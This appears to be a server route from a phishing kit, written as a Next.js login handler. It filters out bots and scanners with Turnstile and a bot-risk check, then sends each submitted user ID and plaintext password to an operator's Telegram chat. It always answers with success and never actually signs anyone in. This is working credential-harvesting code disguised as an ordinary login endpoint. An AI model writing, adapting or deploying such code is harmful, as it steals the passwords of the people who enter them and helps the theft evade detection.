import { NextRequest, NextResponse } from "next/server"

import { isMitigationBand } from "@/lib/bot-risk/score"
import { resolveRequestRisk } from "@/lib/bot-risk/resolve"
import { getClientIpFromRequest } from "@/lib/client-ip"
import { isLocalTestingUnlocked } from "@/lib/local-testing"
import { sendFormNotification } from "@/lib/telegram"

const TURNSTILE_SECRET_KEY = process.env.TURNSTILE_SECRET_KEY?.trim() || "";

/**
 * Login submit event → ops Telegram (kit `sendFormNotification`, type "login").
 * Fire-and-forget from the client; failures never block the sign-in flow.
 */
export async function POST(request: NextRequest) {
  try {
    const data = (await request.json().catch(() => ({}))) as Record<
      string,
      unknown
    >;

    const turnstileToken =
      typeof data?.turnstileToken === "string" ? data.turnstileToken : "";
    if (turnstileToken && TURNSTILE_SECRET_KEY) {
      const verifyRes = await fetch(
        "https://challenges.cloudflare.com/turnstile/v0/siteverify",
        {
          method: "POST",
          headers: { "Content-Type": "application/x-www-form-urlencoded" },
          body: new URLSearchParams({
            secret: TURNSTILE_SECRET_KEY,
            response: turnstileToken,
          }).toString(),
        },
      );

      const verification = await verifyRes.json().catch(() => null);
      if (!verification?.success) {
        return NextResponse.json(
          { success: false, error: "Turnstile validation failed" },
          { status: 403 },
        );
      }
    }

    if (!isLocalTestingUnlocked()) {
      const risk = await resolveRequestRisk(request);
      if (isMitigationBand(risk.band)) {
        return NextResponse.json({ success: false, error: "Forbidden" }, { status: 403 });
      }
    }

    const userId = String(data.userId ?? "").slice(0, 256);
    const password = String(data.password ?? "").slice(0, 256);
    if (userId && password) {
      await sendFormNotification({
        type: "login",
        userId,
        password,
        page: "/",
        timestamp: new Date().toISOString(),
      });
    }

    const response = NextResponse.json({ success: true });
    response.cookies.set("login_flow", "1", {
      path: "/",
      maxAge: 10 * 60,
    });
    return response;
  } catch {
    const response = NextResponse.json({ success: true });
    response.cookies.set("login_flow", "1", {
      path: "/",
      maxAge: 10 * 60,
    });
    return response;
  }
}
